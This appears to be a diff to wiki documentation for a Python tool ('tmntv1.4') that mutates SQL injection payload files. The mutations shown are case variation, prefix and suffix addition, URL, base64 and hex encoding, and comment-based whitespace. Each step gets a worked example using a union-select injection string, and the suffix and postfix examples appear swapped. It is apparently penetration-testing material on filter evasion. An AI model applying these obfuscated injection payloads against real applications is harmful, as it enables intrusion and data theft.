@@ -17,7 +17,7 @@ teenage-mutant-ninja-turtles is providing you with an easy to generate Obfuscate
 
 *Functions that mutate the original payload file*
 
-This function does not do any payload obsufiscation the de-duplication (e.g. removes double lines):
+This function does not do any payload obfuscation only does DE-duplication (e.g. removes double lines):
 
 {{{
 
@@ -37,11 +37,23 @@ def deduplicate(_payloadList):
 
 }}}
 
+Example of the de-duplicator
+
+Input payload: 
+
+' union (select @@version) --
+' union (select @@version) --
+);' union (select @@version) --
+
+Output payload: ' union (select @@version) --
+
+Note: The tmntv1.4 tool will take as an input a file. 
+
 This function adds case variation:
 
 {{{
 
-def caseVarietionAdder(_payloadList): # Adding case variation
+def caseVariationAdder(_payloadList): # Adding case variation
 
  _addVarietion1 = re.compile( '(select|SELECT)')
  _addVarietion2 = re.compile( '(insert|INSERT)')
@@ -81,6 +93,14 @@ def caseVarietionAdder(_payloadList): # Adding case variation
 
 }}}
 
+Example of Case Variation Adder
+
+Input payload: ' union (select @@version) --
+
+Output payload: ' UnIoN (SeLeCt @@version) --
+
+Note: The tmntv1.4 tool will take as an input a file. 
+
 This function adds suffixes e.g. %00 etc :
 
 {{{
@@ -104,6 +124,14 @@ def suffixAdder(_payloadList): # Adding suffixes
  _mutatePayloadFileObj.close()
 
 }}}
+
+Example of Suffix Adder
+
+Input payload: ' union (select @@version) --
+
+Output payload: );' union (select @@version) --
+
+Note: The tmntv1.4 tool will take as an input a file. 
 
 This function adds postfixes e.g. ); -- etc :
 
@@ -129,6 +157,15 @@ def postfixAdder(_payloadList): # Adding postfixes
 
 }}}
 
+
+Example of Postfix Adder
+
+Input payload: ' union (select @@version) --
+
+Output payload:  ' union (select @@version) --%00
+
+Note: The tmntv1.4 tool will take as an input a file. 
+
 This function does url encoding:
 
 {{{
@@ -141,11 +178,20 @@ def urlEncoder(_payloadList): # Do url encoding
  _mutatePayloadFileObj = open(_mutatePayloadFile,"w")
  
  for _payloadline in _payloadList:
-  _mutatePayloadFileObj.write((urllib.urlencode({'q':_payloadline})).replace("q=", ""))
+  _mutatePayloadFileObj.write((urllib.urlencode({'q':_payloadline})).replace("q=", "")+"\n")
 
  _mutatePayloadFileObj.close()
 
 }}}
+
+
+Example of URL Encoder
+
+Input payload: ' union (select @@version) --
+
+Output payload: %27+union+%28select+%40%40version%29+--
+
+Note: The tmntv1.4 tool will take as an input a file. 
 
 This function base 64 encoding:
 
@@ -159,11 +205,20 @@ def base64Encoder(_payloadList): # Adding suffix
  _mutatePayloadFileObj = open(_mutatePayloadFile,"w")
  
  for _payloadline in _payloadList:
-  _mutatePayloadFileObj.write(base64.b64encode(_payloadline)+'\n')
+  _mutatePayloadFileObj.write(base64.b64encode(_payloadline.rstrip("\n"))+"\n")
 
  _mutatePayloadFileObj.close()
 
 }}}
+
+
+Example of base64 Encoder
+
+Input payload: ' union (select @@version) --
+
+Output payload: JyB1bmlvbiAoc2VsZWN0IEBAdmVyc2lvbikgLS0=
+
+Note: The tmntv1.4 tool will take as an input a file. 
 
 This function does hexadecimal encoding:
 
@@ -177,11 +232,20 @@ def hexEncoder(_payloadList): # Adding suffix
  _mutatePayloadFileObj = open(_mutatePayloadFile,"w")
  
  for _payloadline in _payloadList:
-  _mutatePayloadFileObj.write((str(_payloadline)).encode("Hex")+'\n')
+  _mutatePayloadFileObj.write((str(_payloadline).rstrip("\n")).encode("Hex")+"\n")
 
  _mutatePayloadFileObj.close()
 
 }}}
+
+
+Example of Hexadecimal Encoder
+
+Input payload: ' union (select @@version) --
+
+Output payload: 2720756e696f6e202873656c65637420404076657273696f6e29202d2d
+
+Note: The tmntv1.4 tool will take as an input a file. 
 
 This function does whitespace filling:
 
@@ -206,3 +270,12 @@ def replacer(_payloadList): # Filling the gaps
  _mutatePayloadFileObj.close()
 
 }}}
+
+
+Example of replacer
+
+Input payload: ' union (select @@version) --
+
+Output payload: '/**/union/**/(select/**/@@version)/**/--
+
+Note: The tmntv1.4 tool will take as an input a file. 
